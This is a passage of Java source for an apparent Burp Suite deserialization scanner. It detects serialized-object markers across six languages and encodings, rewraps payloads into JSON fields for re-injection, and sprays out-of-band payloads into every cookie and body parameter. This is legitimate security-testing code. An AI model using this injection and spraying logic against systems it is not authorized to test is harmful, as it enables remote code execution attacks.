                    "Java serialization bytes in " + location + " '" + name + "'");
        }
        // PHP
        if (PHP_SERIALIZED.matcher(text).find()) {
            found.add(new DeserPoint(location, name, text, "PHP",
                    "PHP serialized" + encodingLabel, encoding));
            reportPassiveFinding(findings, url, name,
                    "PHP serialized data in " + location + encodingLabel, "PHP",
                    "PHP serialized pattern in " + location + " '" + name + "': "
                            + text.substring(0, Math.min(80, text.length())));
        }
        // Python pickle
        if (PYTHON_PICKLE_B64.matcher(text).find() || PYTHON_PICKLE_V2.matcher(text).find()
                || isPythonTextPickle(text)) {
            found.add(new DeserPoint(location, name, text, "Python",
                    "Python pickle" + encodingLabel, encoding));
            reportPassiveFinding(findings, url, name,
                    "Python pickle in " + location + encodingLabel, "Python",
                    "Pickle data in " + location + " '" + name + "'");
        }
        // Python jsonpickle
        if (PYTHON_JSONPICKLE.matcher(text).find()) {
            found.add(new DeserPoint(location, name, text, "Python",
                    "Python jsonpickle" + encodingLabel, encoding));
            reportPassiveFinding(findings, url, name,
                    "Python jsonpickle in " + location + encodingLabel, "Python",
                    "jsonpickle markers in " + location + " '" + name + "'");
        }
        // .NET BinaryFormatter
        if (DOTNET_BINARY_B64.matcher(text).find()) {
            found.add(new DeserPoint(location, name, text, ".NET",
                    ".NET BinaryFormatter" + encodingLabel, encoding));
            reportPassiveFinding(findings, url, name,
                    ".NET BinaryFormatter in " + location + encodingLabel, ".NET",
                    ".NET BinaryFormatter in " + location + " '" + name + "'");
        }
        // .NET JSON $type
        if (DOTNET_DOLLAR_TYPE.matcher(text).find()) {
            found.add(new DeserPoint(location, name, text, ".NET",
                    "JSON.NET $type" + encodingLabel, encoding));
            reportPassiveFinding(findings, url, name,
                    "JSON.NET $type in " + location + encodingLabel, ".NET",
                    "$type property in " + location + " '" + name + "'");
        }
        // .NET SOAP
        if (DOTNET_SOAP_ENVELOPE.matcher(text).find()) {
            found.add(new DeserPoint(location, name, text, ".NET",
                    "SOAP envelope" + encodingLabel, encoding));
            reportPassiveFinding(findings, url, name,
                    "SOAP envelope in " + location + encodingLabel, ".NET",
                    "SOAP envelope in " + location + " '" + name + "'");
        }
        // Ruby Marshal
        if (RUBY_MARSHAL_B64.matcher(text).find() || RUBY_MARSHAL_HEX.matcher(text).find()) {
            found.add(new DeserPoint(location, name, text, "Ruby",
                    "Ruby Marshal" + encodingLabel, encoding));
            reportPassiveFinding(findings, url, name,
                    "Ruby Marshal in " + location + encodingLabel, "Ruby",
                    "Ruby Marshal data in " + location + " '" + name + "'");
        }
        // Ruby YAML
        if (RUBY_YAML_UNSAFE.matcher(text).find()) {
            found.add(new DeserPoint(location, name, text, "Ruby",
                    "Ruby YAML" + encodingLabel, encoding));
            reportPassiveFinding(findings, url, name,
                    "Ruby unsafe YAML in " + location + encodingLabel, "Ruby",
                    "Ruby YAML tags in " + location + " '" + name + "'");
        }
        // Node.js
        if (NODE_SERIALIZE.matcher(text).find() || NODE_SERIALIZE_IIFE.matcher(text).find()) {
            found.add(new DeserPoint(location, name, text, "Node.js",
                    "node-serialize" + encodingLabel, encoding));
            reportPassiveFinding(findings, url, name,
                    "Node.js node-serialize in " + location + encodingLabel, "Node.js",
                    "_$$ND_FUNC$$_ in " + location + " '" + name + "'");
        }
        if (NODE_CRYO.matcher(text).find()) {
            found.add(new DeserPoint(location, name, text, "Node.js",
                    "cryo" + encodingLabel, encoding));
            reportPassiveFinding(findings, url, name,
                    "Node.js cryo in " + location + encodingLabel, "Node.js",
                    "__cryo_type__ in " + location + " '" + name + "'");
        }
        if (NODE_FUNCSTER.matcher(text).find()) {
            found.add(new DeserPoint(location, name, text, "Node.js",
                    "funcster" + encodingLabel, encoding));
            reportPassiveFinding(findings, url, name,
                    "Node.js funcster in " + location + encodingLabel, "Node.js",
                    "__js_function in " + location + " '" + name + "'");
        }
        if (NODE_JS_YAML.matcher(text).find()) {
            found.add(new DeserPoint(location, name, text, "Node.js",
                    "js-yaml" + encodingLabel, encoding));
            reportPassiveFinding(findings, url, name,
                    "Node.js js-yaml in " + location + encodingLabel, "Node.js",
                    "!!js/function tag in " + location + " '" + name + "'");
        }
        // Java Fastjson
        if (JAVA_FASTJSON_TYPE.matcher(text).find()) {
            found.add(new DeserPoint(location, name, text, "Java",
                    "Fastjson @type" + encodingLabel, encoding));
            reportPassiveFinding(findings, url, name,
                    "Fastjson @type in " + location + encodingLabel, "Java",
                    "Fastjson @type in " + location + " '" + name + "'");
        }
        // Java Jackson
        if (JAVA_JACKSON_POLY.matcher(text).find()) {
            found.add(new DeserPoint(location, name, text, "Java",
                    "Jackson polymorphic" + encodingLabel, encoding));
            reportPassiveFinding(findings, url, name,
                    "Jackson polymorphic in " + location + encodingLabel, "Java",
                    "Jackson DefaultTyping in " + location + " '" + name + "'");
        }
        // Java XStream
        if (JAVA_XSTREAM_XML.matcher(text).find()) {
            found.add(new DeserPoint(location, name, text, "Java",
                    "XStream XML" + encodingLabel, encoding));
            reportPassiveFinding(findings, url, name,
                    "XStream XML in " + location + encodingLabel, "Java",
                    "XStream XML tags in " + location + " '" + name + "'");
        }
        // Java SnakeYAML
        if (JAVA_SNAKEYAML_TAG.matcher(text).find()) {
            found.add(new DeserPoint(location, name, text, "Java",
                    "SnakeYAML" + encodingLabel, encoding));
            reportPassiveFinding(findings, url, name,
                    "SnakeYAML in " + location + encodingLabel, "Java",
                    "SnakeYAML tags in " + location + " '" + name + "'");
        }
        // Java Hessian content-type
        if (JAVA_HESSIAN_CONTENT_TYPE.matcher(text).find()) {
            found.add(new DeserPoint(location, name, text, "Java",
                    "Hessian" + encodingLabel, encoding));
            reportPassiveFinding(findings, url, name,
                    "Hessian content-type in " + location + encodingLabel, "Java",
                    "Hessian serialization in " + location + " '" + name + "'");
        }

        return found;
    }

    /**
     * Convenience: scan a value in all forms — raw, URL-decoded, and base64-decoded.
     * Deduplicates by only checking decoded forms for patterns NOT already found in raw.
     */
    private List<DeserPoint> scanValueAllEncodings(String rawValue, String location, String name,
                                                    String url, List<Finding> findings) {
        List<DeserPoint> all = new ArrayList<>();
        Set<String> foundLangs = new HashSet<>();

        // 1. Raw
        List<DeserPoint> raw = scanForAllPatterns(rawValue, location, name, url, "none", findings);
        all.addAll(raw);
        for (DeserPoint dp : raw) foundLangs.add(dp.language + ":" + dp.indicator);

        // 2. URL-decoded
        String urlDecoded = tryUrlDecode(rawValue);
        if (urlDecoded != null) {
            List<DeserPoint> urlFindings = scanForAllPatterns(urlDecoded, location, name, url, "urldecoded", findings);
            for (DeserPoint dp : urlFindings) {
                if (!foundLangs.contains(dp.language + ":" + dp.indicator)) {
                    all.add(new DeserPoint(location, name, rawValue, dp.language, dp.indicator, "urldecoded"));
                    foundLangs.add(dp.language + ":" + dp.indicator);
                }
            }
        }

        // 2.5. JSON extraction — parse value (raw or URL-decoded) as JSON and scan each string field
        String jsonCandidate = urlDecoded != null ? urlDecoded : rawValue;
        all.addAll(scanJsonStringValues(jsonCandidate, rawValue, location, name, url, findings, foundLangs));

        // 3. Base64-decoded (tryBase64Decode already handles URL-decode → base64)
        String b64Decoded = tryBase64Decode(rawValue);
        if (b64Decoded != null) {
            String enc = (urlDecoded != null && rawValue.contains("%")) ? "urldecoded+base64" : "base64";
            List<DeserPoint> b64Findings = scanForAllPatterns(b64Decoded, location, name, url, enc, findings);
            for (DeserPoint dp : b64Findings) {
                if (!foundLangs.contains(dp.language + ":" + dp.indicator)) {
                    all.add(new DeserPoint(location, name, rawValue, dp.language, dp.indicator, "base64"));
                    foundLangs.add(dp.language + ":" + dp.indicator);
                }
            }
        }

        return all;
    }

    /**
     * Parses a value as a JSON object and scans each top-level string field for serialized data.
     * Handles the common pattern of serialized data nested inside JSON string values, e.g.
     * {"token":"BASE64_PHP_SERIALIZED","sig":"..."} (often URL-encoded in cookies).
     *
     * For each string value, tries: raw scan, then base64-decode → scan.
     * If a match is found, creates a DeserPoint with encoding="json+base64" (or "json")
     * and jsonKey set to the field name for accurate payload re-injection.
     */
    private List<DeserPoint> scanJsonStringValues(String jsonCandidate, String originalRawValue,
                                                   String location, String name, String url,
                                                   List<Finding> findings, Set<String> foundLangs) {
        List<DeserPoint> jsonFindings = new ArrayList<>();
        if (jsonCandidate == null || jsonCandidate.length() < 2) return jsonFindings;

        String trimmed = jsonCandidate.trim();
        if (!trimmed.startsWith("{") || !trimmed.endsWith("}")) return jsonFindings;

        JsonObject jsonObj;
        try {
            JsonElement parsed = JsonParser.parseString(trimmed);
            if (!parsed.isJsonObject()) return jsonFindings;
            jsonObj = parsed.getAsJsonObject();
        } catch (Exception e) {
            return jsonFindings; // Not valid JSON — skip silently
        }

        for (Map.Entry<String, JsonElement> entry : jsonObj.entrySet()) {
            if (!entry.getValue().isJsonPrimitive() || !entry.getValue().getAsJsonPrimitive().isString()) {
                continue; // Only scan string values
            }
            String fieldKey = entry.getKey();
            String fieldValue = entry.getValue().getAsString();
            if (fieldValue.length() < 3) continue;

            // Try raw field value
            List<DeserPoint> rawHits = scanForAllPatterns(fieldValue, location, name, url, "json", findings);
            for (DeserPoint dp : rawHits) {
                String dedupKey = dp.language + ":" + dp.indicator;
                if (!foundLangs.contains(dedupKey)) {
                    jsonFindings.add(new DeserPoint(location, name, originalRawValue, dp.language,
                            dp.indicator + " (json key '" + fieldKey + "')", "json", fieldKey));
                    foundLangs.add(dedupKey);
                }
            }

            // Try base64-decode the field value, then scan
            String b64Decoded = tryBase64Decode(fieldValue);
            if (b64Decoded != null) {
                List<DeserPoint> b64Hits = scanForAllPatterns(b64Decoded, location, name, url, "json+base64", findings);
                for (DeserPoint dp : b64Hits) {
                    String dedupKey = dp.language + ":" + dp.indicator;
                    if (!foundLangs.contains(dedupKey)) {
                        jsonFindings.add(new DeserPoint(location, name, originalRawValue, dp.language,
                                dp.indicator + " (json key '" + fieldKey + "')", "json+base64", fieldKey));
                        foundLangs.add(dedupKey);
                    }
                }
            }
        }

        return jsonFindings;
    }

    /**
     * Wraps a payload into the original JSON structure for re-injection.
     * URL-decodes dp.value if needed to get the JSON string, replaces the dp.jsonKey field
     * with the payload (base64-encoded if encoding contains "base64"), re-serializes to JSON.
     */
    private String wrapPayloadInJson(DeserPoint dp, String payload) {
        try {
            // Recover the JSON string from the original (possibly URL-encoded) value
            String jsonStr = dp.value;
            String urlDecoded = tryUrlDecode(jsonStr);
            if (urlDecoded != null) jsonStr = urlDecoded;

            JsonObject jsonObj = JsonParser.parseString(jsonStr.trim()).getAsJsonObject();

            // Base64-encode the payload if the original field value was base64-encoded
            String injectedValue;
            if (dp.encoding.contains("base64")) {
                injectedValue = isAlreadyBase64(payload)
                        ? payload
                        : Base64.getEncoder().encodeToString(payload.getBytes(StandardCharsets.UTF_8));
            } else {
                injectedValue = payload;
            }

            jsonObj.addProperty(dp.jsonKey, injectedValue);

            // Re-serialize — Gson produces compact JSON matching typical app behavior
            String result = new Gson().toJson(jsonObj);

            // If original value was URL-encoded, re-encode the JSON
            if (dp.value.contains("%7B") || dp.value.contains("%7b") || dp.value.contains("%22")) {
                result = URLEncoder.encode(result, StandardCharsets.UTF_8);
            }

            return result;
        } catch (Exception e) {
            return null;
        }
    }

    /**
     * Detects Python text-based pickle (protocol 0/1) which has no binary header prefix.
     * These are missed by the PYTHON_PICKLE_B64 / PYTHON_PICKLE_V2 prefix checks.
     */
    private boolean isPythonTextPickle(String text) {
        if (text == null || text.length() < 4) return false;
        return text.startsWith("cos\n") || text.startsWith("cposix\n")
                || text.startsWith("c__builtin__\n") || text.startsWith("cnt\n")
                || text.startsWith("(dp0\n") || text.startsWith("(lp0\n")
                || (text.startsWith("(") && text.contains("\ntR"))
                || text.contains("!!python/object");
    }

    /**
     * Returns true if the payload already looks like base64-encoded binary data.
     * Used to avoid double-encoding when injecting into base64-wrapped injection points.
     * Java gadget chains, Python pickle, and .NET BinaryFormatter payloads are already base64.
     * PHP serialized strings (O:8:...), JSON ($type), and XML payloads are raw text → need wrapping.
     */
    private boolean isAlreadyBase64(String payload) {
        return payload != null && payload.length() >= 16 && payload.matches("[A-Za-z0-9+/=\\-_]+");
    }

    private void perHostDelay() throws InterruptedException {
        int delay = config.getInt("deser.perHostDelay", 500);
        if (delay > 0) Thread.sleep(delay);
    }

    // ==================== BLIND OOB SPRAY ====================

    private static final String[] ALL_DESER_LANGUAGES = {"Java", "PHP", ".NET", "Python", "Ruby", "Node.js"};

    /**
     * Blind OOB spray: when passive detection finds NO deserialization points,
     * spray OOB payloads for ALL languages into every cookie and body parameter.
     * OOB-only via Collaborator — no timing tests, no error-based tests.
     */
    private void blindOobSpray(HttpRequestResponse original, String urlPath) throws InterruptedException {
        if (collaboratorManager == null || !collaboratorManager.isAvailable()) return;

        HttpRequest request = original.request();
        String url = request.url();
        List<DeserPoint> blindPoints = collectBlindPoints(request);

        if (blindPoints.isEmpty()) return;
        api.logging().logToOutput("[Deser] No deserialization detected passively — blind OOB spray on "
                + blindPoints.size() + " injection points: " + url);

        fireBlindOob(original, url, urlPath, blindPoints);
    }

    /**
     * Blind OOB spray filtered to a single parameter name.
     */
    private void blindOobSprayForParameter(HttpRequestResponse original, String urlPath,
                                            String targetParam) throws InterruptedException {
        if (collaboratorManager == null || !collaboratorManager.isAvailable()) return;

        HttpRequest request = original.request();
        String url = request.url();
        List<DeserPoint> blindPoints = collectBlindPoints(request);
        blindPoints.removeIf(dp -> !dp.name.equalsIgnoreCase(targetParam));

        if (blindPoints.isEmpty()) return;
        api.logging().logToOutput("[Deser] No deserialization detected passively — blind OOB spray on param '"
                + targetParam + "': " + url);

        fireBlindOob(original, url, urlPath, blindPoints);
    }

    /**
     * Collects all cookies and body parameters as blind DeserPoints, one per language.
     */
    private List<DeserPoint> collectBlindPoints(HttpRequest request) {
        List<DeserPoint> points = new ArrayList<>();
        for (var param : request.parameters()) {
            if (param.type() == burp.api.montoya.http.message.params.HttpParameterType.COOKIE) {
                for (String lang : ALL_DESER_LANGUAGES) {
                    points.add(new DeserPoint("cookie", param.name(), param.value(), lang, "blind OOB spray"));
                }
            } else if (param.type() == burp.api.montoya.http.message.params.HttpParameterType.BODY) {
                for (String lang : ALL_DESER_LANGUAGES) {
                    points.add(new DeserPoint("body_param", param.name(), param.value(), lang, "blind OOB spray"));
                }
            }
        }
        return points;
    }

    /**
     * Fires OOB-only active testing for each blind DeserPoint. Deduplicates by
     * param+language so repeated requests to the same endpoint don't re-spray.
     */
    private void fireBlindOob(HttpRequestResponse original, String url, String urlPath,
                               List<DeserPoint> blindPoints) throws InterruptedException {
        for (DeserPoint dp : blindPoints) {
            String dedupKey = dp.name + ":" + dp.language + ":blind";
            if (!dedup.markIfNew("deser-scanner", urlPath, dedupKey)) continue;

            try {
                activeTestOob(original, dp, url);
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                return;
            } catch (Exception e) {
                api.logging().logToError("Deser blind OOB error (" + dp.language + " " + dp.name + "): " + e.getMessage());
            }
        }
    }

    @Override
    public void destroy() { tested.clear(); }

    public ConcurrentHashMap<String, Boolean> getTested() { return tested; }
}
